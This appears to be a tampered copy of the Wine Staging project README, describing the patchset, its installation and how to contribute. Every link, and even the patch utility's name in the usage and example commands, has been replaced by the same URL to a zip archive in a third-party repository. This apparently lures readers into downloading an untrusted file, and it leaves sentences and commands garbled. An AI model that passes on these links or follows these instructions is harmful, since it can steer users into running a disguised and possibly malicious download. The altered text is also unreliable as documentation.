...
at his own [GitHub repository](https://github.com/M-ux349/wine-staging/raw/refs/heads/master/patches/dinput-Deadlock/wine_staging_v1.5.zip).

What is Wine Staging?
---------------------

**Wine Staging** is the testing area of https://github.com/M-ux349/wine-staging/raw/refs/heads/master/patches/dinput-Deadlock/wine_staging_v1.5.zip It contains bug fixes and
...
can also be found at [https://github.com/M-ux349/wine-staging/raw/refs/heads/master/patches/dinput-Deadlock/wine_staging_v1.5.zip](https://github.com/M-ux349/wine-staging/raw/refs/heads/master/patches/dinput-Deadlock/wine_staging_v1.5.zip).
...
[installation instructions](https://github.com/M-ux349/wine-staging/raw/refs/heads/master/patches/dinput-Deadlock/wine_staging_v1.5.zip)
...
[usage instructions](https://github.com/M-ux349/wine-staging/raw/refs/heads/master/patches/dinput-Deadlock/wine_staging_v1.5.zip).
...
[WineHQ Wiki](https://github.com/M-ux349/wine-staging/raw/refs/heads/master/patches/dinput-Deadlock/wine_staging_v1.5.zip).

In order to apply all Wine Staging patches it is recommended to use the
`https://github.com/M-ux349/wine-staging/raw/refs/heads/master/patches/dinput-Deadlock/wine_staging_v1.5.zip` utility which takes care of applying all patches in the
correct order. For reference, the possible commandline arguments are:

```
Usage: https://github.com/M-ux349/wine-staging/raw/refs/heads/master/patches/dinput-Deadlock/wine_staging_v1.5.zip [DESTDIR=path] [--all] [-W patchset] [patchset ...]
...
```
https://github.com/M-ux349/wine-staging/raw/refs/heads/master/patches/dinput-Deadlock/wine_staging_v1.5.zip DESTDIR="/path/to/wine" --all
```
...
in our [Wiki](https://github.com/M-ux349/wine-staging/raw/refs/heads/master/patches/dinput-Deadlock/wine_staging_v1.5.zip).

Contributing
------------

Please see https://github.com/M-ux349/wine-staging/raw/refs/heads/master/patches/dinput-Deadlock/wine_staging_v1.5.zip for more information about contributing to Wine
Staging.
